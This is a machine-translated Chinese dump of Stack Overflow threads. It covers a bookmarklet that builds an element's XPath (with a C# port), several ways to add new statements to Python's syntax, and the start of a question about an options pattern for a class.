    // We don't really need to go back up to //HTML, since IDs are supposed
    // to be unique, so they are a good starting point.
    return "/" + nodeExpr;
  }
// We don't really need this
//~   if (node.className != '')
//~   {
//~     nodeExpr += "[@class='" + node.className + "']";
//~   }
  // Find rank of node among its type in the parent
  var rank = 1;
  var ps = node.previousSibling;
  while (ps != null)
  {
    if (ps.tagName == node.tagName)
    {
      rank++;
    }
    ps = ps.previousSibling;
  }
  if (rank > 1)
  {
    nodeExpr += '[' + rank + ']';
  }
  else
  {
    // First node of its kind at this level. Are there any others?
    var ns = node.nextSibling;
    while (ns != null)
    {
      if (ns.tagName == node.tagName)
      {
        // Yes, mark it as being the first one
        nodeExpr += '[1]';
        break;
      }
      ns = ns.nextSibling;
    }
  }
  return nodeExpr;
}

var currentNode;
// Standard (?)
if (window.getSelection != undefined) 
  currentNode = window.getSelection().anchorNode;
// IE (if no selection, that's BODY)
else 
  currentNode = document.selection.createRange().parentElement();
if (currentNode == null)
{
  alert("No selection");
  return;
}
var path = [];
// Walk up the Dom
while (currentNode != undefined)
{
  var pe = getNode(currentNode);
  if (pe != null)
  {
    path.push(pe);
    if (pe.indexOf('@id') != -1)
      break;  // Found an ID, no need to go upper, absolute path is OK
  }
  currentNode = currentNode.parentNode;
}
var xpath = "/" + path.reverse().join('/');
alert(xpath);
// Copy to clipboard
// IE
if (window.clipboardData) clipboardData.setData("Text", xpath);
// FF's code to handle clipboard is much more complex 
// and might need to change prefs to allow changing the clipboard content.
// I omit it here as it isn't part of the original request. 
```

您必须选择元素并激活小书签才能获取其 XPath。

现在，书签版本（感谢[Bookmarklet Builder](http://subsimple.com/bookmarklets/jsbuilder.htm "书签生成器")）：

IE
（我不得不把它分成两部分，因为 IE 不喜欢很长的书签（最大大小取决于 IE 版本！）。你必须激活第一个（函数 def）然后是第二个。用 IE6 测试.)

```
javascript:function getNode(node){var nodeExpr=node.tagName;if(!nodeExpr)return null;if(node.id!=''){nodeExpr+="[@id='"+node.id+"']";return "/"+nodeExpr;}var rank=1;var ps=node.previousSibling;while(ps){if(ps.tagName==node.tagName){rank++;}ps=ps.previousSibling;}if(rank>1){nodeExpr+='['+rank+']';}else{var ns=node.nextSibling;while(ns){if(ns.tagName==node.tagName){nodeExpr+='[1]';break;}ns=ns.nextSibling;}}return nodeExpr;}
javascript:function o__o(){var currentNode=document.selection.createRange().parentElement();var path=[];while(currentNode){var pe=getNode(currentNode);if(pe){path.push(pe);if(pe.indexOf('@id')!=-1)break;}currentNode=currentNode.parentNode;}var xpath="/"+path.reverse().join('/');clipboardData.setData("Text", xpath);}o__o(); 
```

法郎

```
javascript:function o__o(){function getNode(node){var nodeExpr=node.tagName;if(nodeExpr==null)return null;if(node.id!=''){nodeExpr+="[@id='"+node.id+"']";return "/"+nodeExpr;}var rank=1;var ps=node.previousSibling;while(ps!=null){if(ps.tagName==node.tagName){rank++;}ps=ps.previousSibling;}if(rank>1){nodeExpr+='['+rank+']';}else{var ns=node.nextSibling;while(ns!=null){if(ns.tagName==node.tagName){nodeExpr+='[1]';break;}ns=ns.nextSibling;}}return nodeExpr;}var currentNode=window.getSelection().anchorNode;if(currentNode==null){alert("No selection");return;}var path=[];while(currentNode!=undefined){var pe=getNode(currentNode);if(pe!=null){path.push(pe);if(pe.indexOf('@id')!=-1)break;}currentNode=currentNode.parentNode;}var xpath="/"+path.reverse().join('/');alert(xpath);}o__o(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-20T07:21:42.377

由于小书签的使用使 Paul 感到困惑，我想我应该对它们的使用做一点介绍。我在单独的消息中这样做以避免混淆。

Bookmarklet（也称为 favlet）是小型 JavaScript 脚本（原文如此），旨在粘贴在浏览器的地址栏中（与任何其他 URL 一样），从而在当前页面上运行。
运行它（粘贴，按 Enter）后，您可以将其添加到书签以供重复使用（将其添加到 IE 中的收藏夹）。请注意，浏览器可能会将原始 URL 加入书签，然后您必须编辑书签并将 URL 替换为您的脚本。
当然，您也可以将其添加到 URL 栏中以便快速访问。

这些脚本就像是当前页面的一部分，访问全局 JS 变量和函数、Dom 对象等。
它们可以超级简单，像开创性的一样，也可以像`javascript: alert("Hello world!");`上面的那样非常复杂。如果它返回一个值（或者如果最后一个表达式有一个值），则该值将替换当前页面。为避免这种情况，您可以完成脚本`alert`（以显示结果）或将脚本包装在函数定义中并调用此函数，就像我在上面所做的那样。（有些人还把 void(0); 放在最后，但我认为这被视为不好的做法。）

函数解决方案的优点是使脚本的所有变量都对小程序本地化（`var`当然，如果用 声明），避免了对本地页面上的脚本的干扰/副作用。这也是为什么包装函数应该有一个不太可能与本地脚本冲突的名称。

请注意，某些浏览器（阅读：“IE”）可以限制 favlet 的大小，最大值。长度随版本变化（趋于减少）。这就是为什么所有无用的空格都被删除的原因（上面链接的书签生成器对此很有用），并且我删除了我通常使用的 null 和 undefined 的显式比较。我还必须将 favlet 分成两部分，第一部分定义一个函数（只要页面没有更改/刷新），第二部分使用它。

有用的工具，特别是在不允许用户脚本（à la Greasemonkey）或没有此扩展的浏览器上。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2011-03-27T20:04:50.710

我已将小书签代码重写为 C#，因此如果您觉得它有用，请使用它；-)

```
using System;
using System.Collections;
using System.Collections.Generic;
using System.Text;

namespace Anotation.Toolbar
{
    class XPath
    {
        public static string getXPath(mshtml.IHTMLElement element)
        {
            if (element == null)
                return "";
            mshtml.IHTMLElement currentNode = element;
            ArrayList path = new ArrayList();

            while (currentNode != null)
            {
                string pe = getNode(currentNode);
                if (pe != null)
                {
                    path.Add(pe);
                    if (pe.IndexOf("@id") != -1)
                        break;  // Found an ID, no need to go upper, absolute path is OK
                }
                currentNode = currentNode.parentElement;
            }
            path.Reverse();
            return join(path, "/");
        }

        private static string join(ArrayList items, string delimiter)
        {
          StringBuilder sb = new StringBuilder();
          foreach (object item in items)
          {
            if (item == null)
                continue;

            sb.Append(delimiter);
            sb.Append(item);
          }
          return sb.ToString();
        }

        private static string getNode(mshtml.IHTMLElement node)
        {
            string nodeExpr = node.tagName;
            if (nodeExpr == null)  // Eg. node = #text
                return null;
            if (node.id != "" && node.id != null)
            {
                nodeExpr += "[@id='" + node.id + "']";
                // We don't really need to go back up to //HTML, since IDs are supposed
                // to be unique, so they are a good starting point.
                return "/" + nodeExpr;
            }

            // Find rank of node among its type in the parent
            int rank = 1;
            mshtml.IHTMLDOMNode nodeDom = node as mshtml.IHTMLDOMNode;
            mshtml.IHTMLDOMNode psDom = nodeDom.previousSibling;
            mshtml.IHTMLElement ps = psDom as mshtml.IHTMLElement;
            while (ps != null)
            {
                if (ps.tagName == node.tagName)
                {
                    rank++;
                }
                psDom = psDom.previousSibling;
                ps = psDom as mshtml.IHTMLElement;
            }
            if (rank > 1)
            {
                nodeExpr += "[" + rank + "]";
            }
            else
            { // First node of its kind at this level. Are there any others?
                mshtml.IHTMLDOMNode nsDom = nodeDom.nextSibling;
                mshtml.IHTMLElement ns = nsDom as mshtml.IHTMLElement;
                while (ns != null)
                {
                    if (ns.tagName == node.tagName)
                    { // Yes, mark it as being the first one
                        nodeExpr += "[1]";
                        break;
                    }
                    nsDom = nsDom.nextSibling;
                    ns = nsDom as mshtml.IHTMLElement;
                }
            }
            return nodeExpr;
        }
    }
} 
```

# python - 你能在 Python 的语法中添加新的语句吗？

> ID：214881
> 
> 赞同：131
> 
> 时间：2008-10-18T10:47:21.730
> 
> 标签：python, syntax, language-specifications

你能在 Python 的语法中添加新的语句（如`print`, `raise`, ）吗？`with`

说，允许..

```
mystatement "Something" 
```

或者，

```
new_if True:
    print "example" 
```

不是如果你*应该*，而是如果可能的话（没有修改python解释器代码）

* * *

## 回答 #1

> 赞同：173
> 
> 时间：2012-02-02T06:39:44.873

您可能会发现这很有用 - [Python internals: added a new statement to Python](http://eli.thegreenplace.net/2010/06/30/python-internals-adding-a-new-statement-to-python/)，在此引用：

* * *

本文试图更好地理解 Python 前端的工作原理。仅仅阅读文档和源代码可能会有点无聊，所以我在这里采取了动手的方法：我将在`until`Python 中添加一个语句。

[本文的所有编码都是针对Python Mercurial 存储库镜像](http://code.python.org/hg/branches/py3k/)中的尖端 Py3k 分支完成的。

### `until`声明_

一些语言，比如 Ruby，有一个语句，它是(等价于)`until`的补充。在 Ruby 中，我可以写：`while``until num == 0``while num != 0`

```
num = 3
until num == 0 do
  puts num
  num -= 1
end 
```

它会打印：

```
3
2
1 
```

所以，我想在 Python 中添加类似的功能。也就是说，能够写：

```
num = 3
until num == 0:
  print(num)
  num -= 1 
```

### 语言倡导题外话

本文并不试图建议`until`向 Python 添加语句。虽然我认为这样的声明会让一些代码更清晰，并且这篇文章展示了它是多么容易添加，但我完全尊重 Python 的极简主义哲学。实际上，我在这里要做的只是深入了解 Python 的内部工作原理。

### 修改语法

Python 使用一个名为`pgen`. 这是一个 LL(1) 解析器，可将 Python 源代码转换为解析树。解析器生成器的输入是文件`Grammar/Grammar`**[1]**。这是一个指定 Python 语法的简单文本文件。

**[1]**：从这里开始，对 Python 源代码中文件的引用相对于源代码树的根目录给出，该目录是您运行 configure 和 make 以构建 Python 的目录。

必须对语法文件进行两次修改。首先是为`until`语句添加定义。我找到了该`while`语句的定义位置 ( `while_stmt`)，并在**[2]**`until_stmt`下方添加：

 **```
compound_stmt: if_stmt | while_stmt | until_stmt | for_stmt | try_stmt | with_stmt | funcdef | classdef | decorated
if_stmt: 'if' test ':' suite ('elif' test ':' suite)* ['else' ':' suite]
while_stmt: 'while' test ':' suite ['else' ':' suite]
until_stmt: 'until' test ':' suite 
```

**[2]**：这演示了我在修改我不熟悉的源代码时使用的一种常用技术：*按相似性工作*。这个原则不会解决你所有的问题，但它绝对可以简化这个过程。由于必须为之做的所有事情`while`也必须为之做`until`，因此它是一个很好的指导方针。

请注意，我决定`else`从我的定义中排除该子句`until`，只是为了让它有点不同（坦率地说，我不喜欢`else`循环子句，并且认为它不适合 Python 的禅宗）。

第二个更改是修改规则`compound_stmt`to include `until_stmt`，如您在上面的代码段中所见。就在 之后`while_stmt`，再次。

`make`修改后运行时`Grammar/Grammar`，注意`pgen`程序运行重新生成`Include/graminit.h`和`Python/graminit.c`，然后重新编译了几个文件。

### 修改 AST 生成代码

在 Python 解析器创建解析树后，此树将转换为 AST，因为 AST在编译过程的后续阶段[更易于使用](http://eli.thegreenplace.net/2009/02/16/abstract-vs-concrete-syntax-trees/)。

因此，我们将访问它定义了 Python AST 的结构，并为我们的新语句`Parser/Python.asdl`添加一个 AST 节点，同样位于以下：`until``while`

```
| While(expr test, stmt* body, stmt* orelse)
| Until(expr test, stmt* body) 
```

如果您现在运行`make`，请注意在编译一堆文件之前，`Parser/asdl_c.py`会运行以从 AST 定义文件生成 C 代码。这（如`Grammar/Grammar`）是 Python 源代码使用迷你语言（换句话说，DSL）来简化编程的另一个示例。另请注意，由于`Parser/asdl_c.py`是 Python 脚本，因此这是一种[引导](http://en.wikipedia.org/wiki/Bootstrapping_%28compilers%29)——要从头开始构建 Python，Python 必须已经可用。

虽然`Parser/asdl_c.py`生成了管理我们新定义的 AST 节点的代码（到文件`Include/Python-ast.h`和`Python/Python-ast.c`中），但我们仍然必须编写将相关解析树节点手动转换为它的代码。这是在文件中完成的`Python/ast.c`。在那里，一个名为`ast_for_stmt`将语句的解析树节点转换为 AST 节点的函数。再一次，在我们的老朋友的指导下`while`，我们直接跳入`switch`处理复合语句并添加一个子句`until_stmt`：

```
case while_stmt:
    return ast_for_while_stmt(c, ch);
case until_stmt:
    return ast_for_until_stmt(c, ch); 
```

现在我们应该实施`ast_for_until_stmt`. 这里是：

```
static stmt_ty
ast_for_until_stmt(struct compiling *c, const node *n)
{
    /* until_stmt: 'until' test ':' suite */
    REQ(n, until_stmt);

    if (NCH(n) == 4) {
        expr_ty expression;
        asdl_seq *suite_seq;

        expression = ast_for_expr(c, CHILD(n, 1));
        if (!expression)
            return NULL;
        suite_seq = ast_for_suite(c, CHILD(n, 3));
        if (!suite_seq)
            return NULL;
        return Until(expression, suite_seq, LINENO(n), n->n_col_offset, c->c_arena);
    }

    PyErr_Format(PyExc_SystemError,
                 "wrong number of tokens for 'until' statement: %d",
                 NCH(n));
    return NULL;
} 
```

同样，这是在仔细查看等效项时编写的`ast_for_while_stmt`，不同之处在于`until`我决定不支持该`else`子句。正如预期的那样，AST 是递归创建的，使用其他 AST 创建函数，例如`ast_for_expr`条件表达式和语句`ast_for_suite`体。`until`最后，返回一个名为的新节点`Until`。

请注意，我们使用和之`n`类的宏访问解析树节点。这些都值得理解——他们的代码在.`NCH``CHILD``Include/node.h`

### 题外话：AST作文

我选择为`until`语句创建一种新类型的 AST，但实际上这不是必需的。我可以节省一些工作并使用现有 AST 节点的组合来实现新功能，因为：

```
until condition:
   # do stuff 
```

在功能上等同于：

```
while not condition:
  # do stuff 
```

我可以创建一个节点，而不是在中创建`Until`节点，而是创建一个节点作为子节点。由于 AST 编译器已经知道如何处理这些节点，因此可以跳过该过程的后续步骤。`ast_for_until_stmt``Not``While`

### 将 AST 编译成字节码

下一步是将 AST 编译成 Python 字节码。编译有一个中间结果，它是一个 CFG（控制流图），但由于相同的代码处理它，我现在将忽略这个细节并将其留给另一篇文章。

我们接下来要看的代码是`Python/compile.c`. 在 的引导下`while`，我们找到了`compiler_visit_stmt`负责将语句编译成字节码的函数。我们添加一个子句`Until`：

```
case While_kind:
    return compiler_while(c, s);
case Until_kind:
    return compiler_until(c, s); 
```

如果您想知道`Until_kind`它是什么，它是`_stmt_kind`从 AST 定义文件自动生成到`Include/Python-ast.h`. 无论如何，我们称其`compiler_until`为，当然，仍然不存在。我一会儿再说。

如果你像我一样好奇，你会发现这`compiler_visit_stmt`很奇怪。没有多少`grep`-ping 源树显示它被调用的位置。在这种情况下，只剩下一个选项 - C macro-fu。事实上，一个简短的调查将我们引向`VISIT`定义在中的宏`Python/compile.c`：

```
#define VISIT(C, TYPE, V) {\
    if (!compiler_visit_ ## TYPE((C), (V))) \
        return 0; \ 
```

它用于调用`compiler_visit_stmt`in `compiler_body`。回到我们的业务，然而......

正如所承诺的，这里是`compiler_until`：

```
static int
compiler_until(struct compiler *c, stmt_ty s)
{
    basicblock *loop, *end, *anchor = NULL;
    int constant = expr_constant(s->v.Until.test);

    if (constant == 1) {
        return 1;
    }
    loop = compiler_new_block(c);
    end = compiler_new_block(c);
    if (constant == -1) {
        anchor = compiler_new_block(c);
        if (anchor == NULL)
            return 0;
    }
    if (loop == NULL || end == NULL)
        return 0;

    ADDOP_JREL(c, SETUP_LOOP, end);
    compiler_use_next_block(c, loop);
    if (!compiler_push_fblock(c, LOOP, loop))
        return 0;
    if (constant == -1) {
        VISIT(c, expr, s->v.Until.test);
        ADDOP_JABS(c, POP_JUMP_IF_TRUE, anchor);
    }
    VISIT_SEQ(c, stmt, s->v.Until.body);
    ADDOP_JABS(c, JUMP_ABSOLUTE, loop);

    if (constant == -1) {
        compiler_use_next_block(c, anchor);
        ADDOP(c, POP_BLOCK);
    }
    compiler_pop_fblock(c, LOOP, loop);
    compiler_use_next_block(c, end);

    return 1;
} 
```

我要坦白：这段代码不是基于对 Python 字节码的深刻理解而编写的。与文章的其余部分一样，它是模仿 kin`compiler_while`函数完成的。但是，通过仔细阅读它，记住 Python VM 是基于堆栈的，并查看`dis`模块的文档，其中包含带有描述[的 Python 字节码列表，](http://docs.python.org/py3k/library/dis.html)可以理解发生了什么。

### 就是这样，我们完成了......不是吗？

完成所有更改并运行`make`后，我们可以运行新编译的 Python 并尝试我们的新`until`语句：

```
>>> until num == 0:
...   print(num)
...   num -= 1
...
3
2
1 
```

瞧，它有效！让我们看看使用`dis`模块为新语句创建的字节码如下：

```
import dis

def myfoo(num):
    until num == 0:
        print(num)
        num -= 1

dis.dis(myfoo) 
```

结果如下：

```
4           0 SETUP_LOOP              36 (to 39)
      >>    3 LOAD_FAST                0 (num)
            6 LOAD_CONST               1 (0)
            9 COMPARE_OP               2 (==)
           12 POP_JUMP_IF_TRUE        38

5          15 LOAD_NAME                0 (print)
           18 LOAD_FAST                0 (num)
           21 CALL_FUNCTION            1
           24 POP_TOP

6          25 LOAD_FAST                0 (num)
           28 LOAD_CONST               2 (1)
           31 INPLACE_SUBTRACT
           32 STORE_FAST               0 (num)
           35 JUMP_ABSOLUTE            3
      >>   38 POP_BLOCK
      >>   39 LOAD_CONST               0 (None)
           42 RETURN_VALUE 
```

最有趣的操作是数字 12：如果条件为真，我们跳到循环之后。这是正确的语义`until`。如果未执行跳转，则循环体继续运行，直到它跳转回操作 35 处的条件。

对我的更改感觉良好，然后我尝试运行该函数（正在执行`myfoo(3)`）而不是显示其字节码。结果并不令人鼓舞：

```
Traceback (most recent call last):
  File "zy.py", line 9, in
    myfoo(3)
  File "zy.py", line 5, in myfoo
    print(num)
SystemError: no locals when loading 'print' 
```

哇……这可不好。那么出了什么问题呢？

### 缺少符号表的情况

Python 编译器在编译 AST 时执行的步骤之一是为其编译的代码创建符号表。对`PySymtable_Build`in的`PyAST_Compile`调用调用符号表模块 ( `Python/symtable.c`)，它以类似于代码生成函数的方式遍历 AST。每个作用域都有一个符号表有助于编译器找出一些关键信息，例如哪些变量是全局的，哪些是作用域的局部变量。

为了解决这个问题，我们必须修改 中的`symtable_visit_stmt`函数，在语句**[3]**的类似代码之后`Python/symtable.c`添加处理语句的代码：`until``while`

 **```
case While_kind:
    VISIT(st, expr, s->v.While.test);
    VISIT_SEQ(st, stmt, s->v.While.body);
    if (s->v.While.orelse)
        VISIT_SEQ(st, stmt, s->v.While.orelse);
    break;
case Until_kind:
    VISIT(st, expr, s->v.Until.test);
    VISIT_SEQ(st, stmt, s->v.Until.body);
    break; 
```

**[3]**：顺便说一句，如果没有此代码，则会出现编译器警告`Python/symtable.c`。编译器注意到`Until_kind`枚举值没有在 switch 语句中处理`symtable_visit_stmt`并抱怨。检查编译器警告总是很重要的！

现在我们真的完成了。`myfoo(3)`在此更改之后编译源代码可以按预期执行工作。

### 结论

在本文中，我演示了如何向 Python 添加新语句。尽管需要对 Python 编译器的代码进行大量修改，但更改并不难实现，因为我使用了类似的现有语句作为指导。

Python 编译器是一个复杂的软件块，我并不声称自己是这方面的专家。但是，我对 Python 的内部结构非常感兴趣，尤其是它的前端。因此，我发现这个练习对于编译器原理和源代码的理论研究非常有用。它将作为将来深入了解编译器的文章的基础。

### 参考

我使用了一些优秀的参考资料来构建这篇文章。它们在这里，没有特别的顺序：

*   [PEP 339：CPython 编译器的设计](http://www.python.org/dev/peps/pep-0339/)——可能是 Python 编译器最重要和最全面的*官方*文档。非常简短，它痛苦地显示了 Python 内部的良好文档的稀缺性。
*   “Python Compiler Internals”——Thomas Lee 的文章
*   “Python：设计与实现”——Guido van Rossum 的演讲
*   Python (2.5) 虚拟机，导览 - Peter Tröger 的演讲

[原始来源](http://eli.thegreenplace.net/2010/06/30/python-internals-adding-a-new-statement-to-python/)

* * *

## 回答 #2

> 赞同：56
> 
> 时间：2008-10-18T23:15:04.043

做这样的事情的一种方法是预处理源并修改它，将添加的语句转换为 python。这种方法会带来各种问题，我不建议将其用于一般用途，但对于语言实验或特定用途的元编程，它有时会很有用。

例如，假设我们要引入“myprint”语句，而不是打印到屏幕上，而是记录到特定文件。IE：

```
myprint "This gets logged to file" 
```

相当于

```
print >>open('/tmp/logfile.txt','a'), "This gets logged to file" 
```

关于如何进行替换，有多种选择，从正则表达式替换到生成 AST，再到编写自己的解析器，具体取决于您的语法与现有 python 的匹配程度。一个好的中间方法是使用 tokenizer 模块。这应该允许您添加新的关键字、控制结构等，同时以类似于 python 解释器的方式解释源代码，从而避免粗制正则表达式解决方案可能导致的损坏。对于上面的“myprint”，您可以编写以下转换代码：

```
import tokenize

LOGFILE = '/tmp/log.txt'
def translate(readline):
    for type, name,_,_,_ in tokenize.generate_tokens(readline):
        if type ==tokenize.NAME and name =='myprint':
            yield tokenize.NAME, 'print'
            yield tokenize.OP, '>>'
            yield tokenize.NAME, "open"
            yield tokenize.OP, "("
            yield tokenize.STRING, repr(LOGFILE)
            yield tokenize.OP, ","
            yield tokenize.STRING, "'a'"
            yield tokenize.OP, ")"
            yield tokenize.OP, ","
        else:
            yield type,name 
```

（这确实使 myprint 有效地成为关键字，因此在其他地方用作变量可能会导致问题）

那么问题是如何使用它，以便您的代码可以从 python 中使用。一种方法是编写您自己的导入函数，并使用它来加载以您的自定义语言编写的代码。IE：

```
import new
def myimport(filename):
    mod = new.module(filename)
    f=open(filename)
    data = tokenize.untokenize(translate(f.readline))
    exec data in mod.__dict__
    return mod 
```

但是，这需要您以不同于普通 python 模块的方式处理自定义代码。即“ `some_mod = myimport("some_mod.py")`”而不是“ `import some_mod`”

另一个相当简洁（尽管很老套）的解决方案是创建一个自定义编码（参见[PEP 263](http://www.python.org/dev/peps/pep-0263/)），如[本](http://code.activestate.com/recipes/546539/)秘籍所示。您可以将其实现为：

```
import codecs, cStringIO, encodings
from encodings import utf_8

class StreamReader(utf_8.StreamReader):
    def __init__(self, *args, **kwargs):
        codecs.StreamReader.__init__(self, *args, **kwargs)
        data = tokenize.untokenize(translate(self.stream.readline))
        self.stream = cStringIO.StringIO(data)

def search_function(s):
    if s!='mylang': return None
    utf8=encodings.search_function('utf8') # Assume utf8 encoding
    return codecs.CodecInfo(
        name='mylang',
        encode = utf8.encode,
        decode = utf8.decode,
        incrementalencoder=utf8.incrementalencoder,
        incrementaldecoder=utf8.incrementaldecoder,
        streamreader=StreamReader,
        streamwriter=utf8.streamwriter)

codecs.register(search_function) 
```

现在，在此代码运行后（例如，您可以将其放在 .pythonrc 或 site.py 中）任何以注释“# coding: mylang”开头的代码都将通过上述预处理步骤自动翻译。例如。

```
# coding: mylang
myprint "this gets logged to file"
for i in range(10):
    myprint "so does this : ", i, "times"
myprint ("works fine" "with arbitrary" + " syntax" 
  "and line continuations") 
```

注意事项：

预处理器方法存在一些问题，如果您使用过 C 预处理器，您可能会很熟悉。主要是调试。所有 python 看到的是预处理文件，这意味着堆栈跟踪等中打印的文本将引用该文件。如果您进行了重要的翻译，这可能与您的源文本有很大不同。上面的例子没有改变行号等，所以不会有太大的不同，但是你改变的越多，就越难弄清楚。

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2008-10-19T18:52:00.270

是的，在某种程度上这是可能的。有一个[模块](http://entrian.com/goto/)用于`sys.settrace()`实现`goto`和`comefrom`“关键字”：

```
from goto import goto, label
for i in range(1, 10):
  for j in range(1, 20):
    print i, j
    if j == 3:
      goto .end # breaking out from nested loop
label .end
print "Finished" 
```

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2008-10-18T11:16:45.477

如果没有更改和重新编译源代码（这*可以*通过开源实现），更改基础语言实际上是不可能的。

即使您确实重新编译了源代码，它也不会是 python，只是您修改后的版本，您需要非常小心，不要将错误引入其中。

但是，我不确定您为什么要这样做。Python 的面向对象特性使得使用该语言实现类似结果变得非常简单。

* * *

## 回答 #5

> 赞同：13
> 
> 时间：2008-10-21T05:26:58.630

一般答案：您需要预处理源文件。

更具体的答案：安装[EasyExtend](http://pypi.python.org/pypi/EasyExtend)，然后执行以下步骤

i）创建一个新的langlet（扩展语言）

```
import EasyExtend
EasyExtend.new_langlet("mystmts", prompt = "my> ", source_ext = "mypy") 
```

如果没有额外的规范，应该在 EasyExtend/langlets/mystmts/ 下创建一堆文件。

ii) 打开 mystmts/parsedef/Grammar.ext 并添加以下行

```
small_stmt: (expr_stmt | print_stmt  | del_stmt | pass_stmt | flow_stmt |
             import_stmt | global_stmt | exec_stmt | assert_stmt | my_stmt )

my_stmt: 'mystatement' expr 
```

这足以定义新语句的语法。small_stmt 非终结符是 Python 语法的一部分，它是新语句的挂接位置。解析器现在将识别新语句，即将解析包含它的源文件。编译器会拒绝它，因为它仍然必须转换为有效的 Python。

iii) 现在必须添加语句的语义。为此，必须编辑 msytmts/langlet.py 并添加一个 my_stmt 节点访问者。

```
 def call_my_stmt(expression):
     "defines behaviour for my_stmt"
     print "my stmt called with", expression

 class LangletTransformer(Transformer):
       @transform
       def my_stmt(self, node):
           _expr = find_node(node, symbol.expr)
           return any_stmt(CST_CallFunc("call_my_stmt", [_expr]))

 __publish__ = ["call_my_stmt"] 
```

iv) cd 到 langlets/mystmts 并输入

```
python run_mystmts.py 
```

现在应该开始一个会话并且可以使用新定义的语句：

```
__________________________________________________________________________________

 mystmts

 On Python 2.5.1 (r251:54863, Apr 18 2007, 08:51:08) [MSC v.1310 32 bit (Intel)]
 __________________________________________________________________________________

 my> mystatement 40+2
 my stmt called with 42 
```

相当多的步骤才能得出一个微不足道的声明，对吧？目前还没有一种 API 可以让人们定义简单的事物而不必关心语法。但是 EE 以一些错误为模非常可靠。因此，一个 API 的出现只是时间问题，它允许程序员使用方便的 OO 编程来定义方便的东西，如中缀运算符或小语句。对于更复杂的事情，例如通过构建 langlet 将整个语言嵌入 Python 中，没有办法绕过完整的语法方法。

* * *

## 回答 #6

> 赞同：12
> 
> 时间：2011-01-01T02:23:19.563

这是一种非常简单但很糟糕的添加新语句的方法，*仅在解释模式下*。我将它用于仅使用 sys.displayhook 编辑基因注释的小 1 字母命令，但为了回答这个问题，我也为语法错误添加了 sys.excepthook。后者真的很难看，从 readline 缓冲区中获取原始代码。好处是，以这种方式添加新语句非常容易。

```
 jcomeau@intrepid:~/$ cat demo.py; ./demo.py
#!/usr/bin/python -i
'load everything needed under "package", such as package.common.normalize()'
import os, sys, readline, traceback
if __name__ == '__main__':
    class t:
        @staticmethod
        def localfunction(*args):
            print 'this is a test'
            if args:
                print 'ignoring %s' % repr(args)

    def displayhook(whatever):
        if hasattr(whatever, 'localfunction'):
            return whatever.localfunction()
        else:
            print whatever

    def excepthook(exctype, value, tb):
        if exctype is SyntaxError:
            index = readline.get_current_history_length()
            item = readline.get_history_item(index)
            command = item.split()
            print 'command:', command
            if len(command[0]) == 1:
                try:
                    eval(command[0]).localfunction(*command[1:])
                except:
                    traceback.print_exception(exctype, value, tb)
        else:
            traceback.print_exception(exctype, value, tb)

    sys.displayhook = displayhook
    sys.excepthook = excepthook
>>> t
this is a test
>>> t t
command: ['t', 't']
this is a test
ignoring ('t',)
>>> ^D 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2008-10-18T13:26:37.120

我找到了添加新语句的指南：

[https://troeger.eu/files/teaching/pythonvm08lab.pdf](https://troeger.eu/files/teaching/pythonvm08lab.pdf)

基本上，要添加新语句，您必须编辑`Python/ast.c`（除其他外）并重新编译 python 二进制文件。

虽然有可能，但不要。您可以通过函数和类实现几乎所有内容（不需要人们重新编译 python 只是为了运行您的脚本..）

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-10-20T02:29:20.377

[使用EasyExtend](http://www.fiber-space.de/EasyExtend/doc/EE.html)可以做到这一点：

> EasyExtend (EE) 是一个用纯 Python 编写并与 CPython 集成的预处理器生成器和元编程框架。EasyExtend 的主要目的是创建扩展语言，即向 Python 添加自定义语法和语义。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2015-07-01T01:34:23.450

它并不完全是在语言语法中添加新语句，但宏是一个强大的工具：[https ://github.com/lihaoyi/macropy](https://github.com/lihaoyi/macropy)

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2008-10-19T08:36:50.883

有一种基于 python 的语言[Logix](http://www.livelogix.net/logix/)，你可以用它来做这些事情。它已经有一段时间没有开发了，但是您要求的功能可以**在**最新版本中使用。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2015-01-08T13:53:13.363

有些事情可以用装饰器来完成。让我们假设，Python 没有`with`声明。然后我们可以实现类似的行为，如下所示：

```
# ====== Implementation of "mywith" decorator ======

def mywith(stream):
    def decorator(function):
        try: function(stream)
        finally: stream.close()
    return decorator

# ====== Using the decorator ======

@mywith(open("test.py","r"))
def _(infile):
    for l in infile.readlines():
        print(">>", l.rstrip()) 
```

这是一个非常不干净的解决方案，但正如这里所做的那样。尤其是装饰器调用函数并设置`_`为的行为`None`是出乎意料的。澄清一下：这个装饰器相当于写

```
def _(infile): ...
_ = mywith(open(...))(_) # mywith returns None. 
```

装饰器通常被期望修改而不是执行函数。

我之前在脚本中使用过这样的方法，我必须为几个函数临时设置工作目录。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-10-18T11:18:17.470

不是不修改解释器。我知道过去几年有很多语言被描述为“可扩展的”，但不是您描述的方式。您可以通过添加函数和类来扩展 Python。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-10-18T11:10:15.007

十年前你不能，我怀疑这已经改变了。但是，如果您准备重新编译python，那么修改语法并不难，我怀疑这也改变了。

# design-patterns - 是否有向类添加“选项”的模式？

> ID：214884
> 
> 赞同：5
> 
> 时间：2008-10-18T10:49:53.957
> 
> 标签：design-patterns, configuration

我有一门课，我想在其上允许几个（~20+）配置选项。每个选项打开或关闭一项功能，或以其他方式改变操作。为了促进这一点，我用默认值编写了一个单独的选项类。但是，我不得不在代码中添加保护条件来确定方法的行为方式。我快完成了，但现在代码似乎有异味。

是否有首选的方法/模式来实现这样的类？

**编辑：**更具体地说，我正在研究一个解析类。每个选项配置基本解析算法的互斥部分。例如，我的班级中有几个区域如下所示：

```
 if (this.Option.UseIdAttribute)
      attributeIDs = new Hashtable();
 else
      attributeIDs = null;

    public Element GetElementById(string id)
    {
        if (string.IsNullOrEmpty (id))
            throw new ArgumentNullException("id");

        if (attributeIDs == null)
            throw new Exception(ExceptionUseIdAttributeFalse);

        return attributeIDs[id.ToLower()] as Element;
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-18T10:56:26.110

[装饰器模式](http://en.wikipedia.org/wiki/Decorator_Pattern)怎么样？它旨在为类动态添加行为。

* * *

## 回答 #2

> 赞同：2
> 
